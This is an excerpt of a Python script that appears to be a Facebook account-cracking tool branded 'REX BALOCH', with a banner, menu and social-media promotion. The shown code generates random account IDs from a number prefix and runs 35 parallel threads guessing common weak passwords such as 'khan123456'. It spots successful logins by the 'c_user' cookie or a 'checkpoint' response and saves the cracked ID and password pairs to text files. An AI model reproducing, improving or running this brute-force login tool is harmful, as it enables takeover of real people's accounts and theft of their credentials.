...
logo=("""\033[1;31m     
      ...
      \033[1;31m         ##     ## ######## ##     ##                                                        
\033[1;34m--------------------------------------------------
\033[1;39m \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m: \033[1;33mREX x ZEAMAL
\033[1;39m \033[0;92m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m: \033[1;32mREX BALOCH
\033[1;39m \033[0;93m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m: \033[1;33mREX BALOCH
\033[1;39m \033[0;94m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m: \033[1;34mREX BALOCH 
\033[1;39m \033[0;95m𝙎𝙏𝘼𝙏𝙐𝙎  \033[1;39m: \033[0;92mFOLLOW FB AND ENJOY
...
def menu():
			...
			print('[7] Join watsapp Group ')
			print('\x1b[1;91m[8] Exit main menu')
			linex()
			rex=input(' Choose an option: ')
			if rex in ['1','01']:
				os.system('clear')
				print(logo)
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mREX BALOCH\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[REX BALOCH-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/REX BALOCH-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[REX BALOCH-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/REX BALOCH-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[REX BALOCH-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/REX BALOCH-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def rex1():
	...
	print('\x1b[1;97m[2] Pak Random Method VIP \x1b[1;92m[2]')
...
def random_number5():
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'khan123456','janjan','jan12345','khan1122']
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[REX BALOCH-OK] '+cid+' | '+ps+'\033[1;32m')
				open('REX BALOCH-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[REX BALOCH-CP] '+cid+' | '+ps+'\33[0;97m')
				open('REX BALOCH-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
